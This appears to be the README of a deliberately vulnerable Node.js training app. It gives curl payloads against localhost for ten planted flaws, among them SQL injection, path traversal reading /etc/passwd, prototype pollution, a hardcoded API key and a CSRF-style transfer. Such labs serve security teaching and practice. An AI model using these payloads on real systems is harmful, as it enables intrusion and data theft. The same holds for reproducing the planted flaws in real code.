# Quick Start Guide

## Installation

```bash
npm install
```

## Running the App

```bash
npm start
```

The app will start on `http://localhost:3000`

## Testing Vulnerabilities

In a separate terminal, run:

```bash
node test-vulnerabilities.js
```

This will automatically test all 10 vulnerabilities and display results.

## Manual Testing with curl

### 1. Health Check
```bash
curl http://localhost:3000/health
```

### 2. SQL Injection
```bash
curl "http://localhost:3000/api/users/admin' OR '1'='1"
```

### 3. Access Admin Endpoint with Hardcoded Key
```bash
curl "http://localhost:3000/api/admin/users?api_key=sk-1234567890abcdefghijklmnop"
```

### 4. IDOR - Access Any User
```bash
curl http://localhost:3000/api/user/1
curl http://localhost:3000/api/user/2
```

### 5. Prototype Pollution
```bash
curl -X POST http://localhost:3000/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```

### 6. Login (Weak Token)
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "password123"}'
```

### 7. Path Traversal
```bash
curl "http://localhost:3000/api/file/../../../etc/passwd"
```

### 8. Debug Endpoint
```bash
curl http://localhost:3000/api/debug
```

### 9. Password Reset (No Rate Limiting)
```bash
curl -X POST http://localhost:3000/api/password-reset \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com"}'
```

### 10. CSRF - Transfer Money
```bash
curl -X POST http://localhost:3000/api/transfer \
  -H "Content-Type: application/json" \
  -d '{"fromUser": "admin", "toUser": "attacker", "amount": 1000}'
```

## Key Vulnerabilities

| # | Vulnerability | Endpoint | Severity |
|---|---|---|---|
| 1 | Hardcoded API Key | `/api/admin/users` | Critical |
| 2 | SQL Injection | `/api/users/:username` | Critical |
| 3 | IDOR | `/api/user/:id` | High |
| 4 | Prototype Pollution | `/api/config` | High |
| 5 | Weak Authentication | `/api/admin/users` | High |
| 6 | Sensitive Data Exposure | `/api/login` | High |
| 7 | Path Traversal | `/api/file/:filename` | Medium |
| 8 | Debug Endpoint | `/api/debug` | Critical |
| 9 | No CSRF Protection | `/api/transfer` | Medium |
| 10 | No Rate Limiting | `/api/password-reset` | Medium |

## Educational Purpose

This app demonstrates real-world vulnerabilities found in production systems. Use it to:
- Learn about common security flaws
- Practice penetration testing techniques
- Understand how to identify vulnerabilities
- Learn proper remediation strategies

## Disclaimer

⚠️ **This application is for educational and authorized security testing only.**

Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing security.
